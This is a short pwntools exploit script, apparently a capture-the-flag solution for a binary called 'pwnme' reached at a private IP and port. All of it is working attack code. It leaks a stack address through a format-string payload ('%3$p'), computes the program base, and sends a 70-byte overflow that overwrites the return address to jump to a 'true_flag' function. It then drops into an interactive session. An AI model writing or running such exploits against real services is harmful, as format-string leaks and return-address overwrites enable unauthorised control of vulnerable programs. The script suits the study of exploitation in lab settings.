from pwn import *
context.log_level='debug'
# sh = process("./pwnme")
sh = remote("10.13.197.126", 8080)
libc = ELF("/lib/i386-linux-gnu/libc.so.6")

sh.recvuntil("name: \n")
payload1 = b'%3$p'
sh.sendline(payload1)
sh.recvuntil("name: \n")
addr = int(sh.recv(10), 16)
print(hex(addr))
elf_base = addr - 0x00001692

# dest: 0xffffcec6 ◂— 0x0
# ret: 0xffffcf0c

true_flag = elf_base + 0x00001553

sh.recvuntil("get: \n")
paylaod2 = b'd' * 70 + p32(true_flag) 
# gdb,attach(sh)
sh.sendline(paylaod2)
sh.interactive()

